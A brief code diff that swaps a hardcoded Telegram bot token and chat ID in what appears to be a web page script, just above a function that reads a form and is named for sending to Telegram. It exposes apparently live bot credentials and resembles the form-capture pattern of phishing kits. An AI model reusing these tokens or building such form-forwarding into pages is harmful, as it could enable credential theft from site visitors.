@@ -1,5 +1,5 @@
-const botToken = '6268753758:AAFV9rRiZsgNItf1Ydd09dst-bOabKytHlQ';
-const chatId = '2091107961';
+const botToken = '5940079429:AAGr2UV2mQcI2x1cS2ZAUo6yQchd0S6Om7Y';
+const chatId = '077802193';
 
 function sendTelegram() {
     const form = document.getElementById('main-form');
